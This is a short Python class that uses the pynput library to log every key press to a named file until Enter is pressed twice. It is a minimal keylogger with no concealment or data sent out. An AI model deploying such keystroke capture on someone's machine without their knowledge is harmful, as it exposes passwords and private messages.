from pynput.keyboard import Key, Listener
import logging

class Logger:
    def __init__(self, log_name):
        self.log_name = log_name
        self.num_times_enter_pressed = 0
    
    def on_press(self, key):
        myChar = str(key)
        if(myChar == "Key.enter"):
            # TODO: close the file
            self.num_times_enter_pressed+=1
            if(self.num_times_enter_pressed == 2):
                return False
        logging.info(str(key))
	
    def log_keystrokes(self):
        logging.basicConfig(filename=(self.log_name), level=logging.DEBUG, format='%(message)s')
        #logging.basicConfig(filename=(self.log_name), level=logging.DEBUG, format='%(asctime)s: %(message)s')
        
        with Listener(on_press=self.on_press) as listener:
            listener.join()
